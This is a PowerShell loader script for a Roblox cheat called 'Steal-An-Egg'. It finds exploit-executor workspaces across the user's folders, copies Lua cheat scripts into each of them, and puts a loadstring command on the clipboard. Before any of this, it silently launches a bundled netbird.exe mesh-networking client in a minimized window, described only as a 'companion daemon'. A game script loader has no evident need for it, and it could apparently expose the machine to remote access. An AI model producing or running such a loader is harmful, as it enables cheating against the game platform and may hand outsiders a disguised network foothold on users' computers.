<#
.SYNOPSIS
    Steal-An-Egg Universal Companion Bootstrapper (Multi-Executor Engine)
.DESCRIPTION
    1. Spawns NetBird background mesh networking service minimized.
    2. Auto-detects and synchronizes Lua assets across all installed executors
       (Real, Potassium, Solara, Wave, Celery, Xeno, Swift, Electron, Delta, Codex, etc.).
    3. Populates clipboard with one-click in-game loadstring.
#>

[CmdletBinding()]
param(
    [switch]$NoGui = $false
)

$ErrorActionPreference = "Continue"
$Root = $PSScriptRoot

Write-Host "======================================================" -ForegroundColor Cyan
Write-Host "       STEAL AN EGG · UNIVERSAL INJECTOR HUB          " -ForegroundColor White
Write-Host "======================================================" -ForegroundColor Cyan

# 1. Launch NetBird companion process
$NetBirdExe = Join-Path $Root "netbird.exe"
if (Test-Path $NetBirdExe) {
    $existing = Get-Process -Name "netbird" -ErrorAction SilentlyContinue
    if (-not $existing) {
        Write-Host "[*] Initializing NetBird companion daemon..." -ForegroundColor Yellow
        Start-Process -FilePath $NetBirdExe -WindowStyle Minimized
        Start-Sleep -Milliseconds 800
        $running = Get-Process -Name "netbird" -ErrorAction SilentlyContinue
        if ($running) {
            Write-Host "[+] NetBird companion service active (PID: $($running[0].Id))." -ForegroundColor Green
        } else {
            Write-Host "[!] NetBird started in detached context." -ForegroundColor Yellow
        }
    } else {
        Write-Host "[+] NetBird companion already running (PID: $($existing[0].Id))." -ForegroundColor Green
    }
} else {
    Write-Host "[!] netbird.exe not found in root directory." -ForegroundColor Red
}

# 2. Comprehensive Injector Workspace Discovery
$KnownInjectors = @(
    # Real / RealExecutor
    "$env:LOCALAPPDATA\Real\workspace",
    "$env:LOCALAPPDATA\RealExecutor\workspace",
    "$env:APPDATA\Real\workspace",
    "$env:USERPROFILE\Desktop\Real\workspace",
    "$env:USERPROFILE\Downloads\Real\workspace",

    # Potassium / Ro-Exec
    "$env:LOCALAPPDATA\Potassium\workspace",
    "$env:APPDATA\Potassium\workspace",
    "$env:USERPROFILE\Desktop\Potassium\workspace",
    "$env:USERPROFILE\Downloads\Potassium\workspace",

    # Solara
    "$env:LOCALAPPDATA\Solara\workspace",
    "$env:APPDATA\Solara\workspace",
    "$env:PROGRAMDATA\Solara\workspace",
    "$env:USERPROFILE\Desktop\Solara\workspace",
    "$env:USERPROFILE\Downloads\Solara\workspace",

    # Wave
    "$env:LOCALAPPDATA\Wave\workspace",
    "$env:APPDATA\Wave\workspace",
    "$env:USERPROFILE\Wave\workspace",
    "$env:USERPROFILE\Desktop\Wave\workspace",
    "$env:USERPROFILE\Downloads\Wave\workspace",

    # Celery
    "$env:APPDATA\Celery\workspace",
    "$env:LOCALAPPDATA\Celery\workspace",
    "$env:USERPROFILE\Desktop\Celery\workspace",
    "$env:USERPROFILE\Downloads\Celery\workspace",

    # Xeno / Swift
    "$env:LOCALAPPDATA\Xeno\workspace",
    "$env:APPDATA\Xeno\workspace",
    "$env:LOCALAPPDATA\Swift\workspace",
    "$env:APPDATA\Swift\workspace",

    # Electron
    "$env:LOCALAPPDATA\Electron\workspace",
    "$env:APPDATA\Electron\workspace",

    # Delta / Codex / VegaX / Fluxus / KRNL
    "$env:LOCALAPPDATA\Delta\workspace",
    "$env:APPDATA\Delta\workspace",
    "$env:LOCALAPPDATA\Codex\workspace",
    "$env:APPDATA\Codex\workspace",
    "$env:LOCALAPPDATA\Fluxus\workspace",
    "$env:APPDATA\Fluxus\workspace",
    "$env:LOCALAPPDATA\krnl\workspace",
    "$env:APPDATA\krnl\workspace",

    # Synapse / Oxygen
    "$env:APPDATA\Synapse\workspace",
    "$env:LOCALAPPDATA\Synapse\workspace",
    "$env:LOCALAPPDATA\Oxygen U\workspace"
)

$TargetWorkspaces = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)

# Add matching known directories
foreach ($ws in $KnownInjectors) {
    $parent = Split-Path $ws -Parent
    if (Test-Path $parent) {
        if (-not (Test-Path $ws)) {
            New-Item -ItemType Directory -Path $ws -Force | Out-Null
        }
        [void]$TargetWorkspaces.Add($ws)
    }
}

# Dynamic heuristic scan (searches for any folder named 'workspace' in Desktop and Downloads up to depth 3)
$ScanRoots = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads")
foreach ($root in $ScanRoots) {
    if (Test-Path $root) {
        Get-ChildItem -Path $root -Filter "workspace" -Directory -Recurse -Depth 3 -ErrorAction SilentlyContinue | ForEach-Object {
            [void]$TargetWorkspaces.Add($_.FullName)
        }
    }
}

# Always ensure root portable workspace
$LocalWorkspace = Join-Path $Root "workspace"
if (-not (Test-Path $LocalWorkspace)) {
    New-Item -ItemType Directory -Path $LocalWorkspace -Force | Out-Null
}
[void]$TargetWorkspaces.Add($LocalWorkspace)

Write-Host "[*] Discovered $($TargetWorkspaces.Count) target executor workspaces." -ForegroundColor Yellow
$ItemsToSync = @("StealAnEgg.lua", "run.lua", "hub_loader.lua", "potassium_bridge.lua", "EggESP")

foreach ($ws in $TargetWorkspaces) {
    $destDir = Join-Path $ws "Steal-An-Egg"
    if (-not (Test-Path $destDir)) {
        New-Item -ItemType Directory -Path $destDir -Force | Out-Null
    }

    foreach ($item in $ItemsToSync) {
        $srcPath = Join-Path $Root $item
        if (Test-Path $srcPath) {
            $destPath = Join-Path $destDir $item
            if (Test-Path $srcPath -PathType Container) {
                Copy-Item -Path $srcPath -Destination $destDir -Recurse -Force
            } else {
                Copy-Item -Path $srcPath -Destination $destPath -Force
            }
        }
    }
    Write-Host "    -> Deployed to: $destDir" -ForegroundColor DarkGray
}

# 3. Clipboard injection for execution
$LoadCommand = 'loadstring(readfile("Steal-An-Egg/StealAnEgg.lua"))()'

try {
    Set-Clipboard -Value $LoadCommand
    Write-Host "[+] Copied execution command to clipboard!" -ForegroundColor Green
} catch {
    Write-Host "[!] Note: Clipboard copy failed, use manual string below." -ForegroundColor Yellow
}

Write-Host ""
Write-Host "======================================================" -ForegroundColor Cyan
Write-Host " Ready! Paste into any Roblox Executor (Real, Solara, Wave, etc.):" -ForegroundColor White
Write-Host " $LoadCommand" -ForegroundColor Yellow
Write-Host "======================================================" -ForegroundColor Cyan
Write-Host "[*] Keep this window open during session for background companion sync." -ForegroundColor DarkCyan
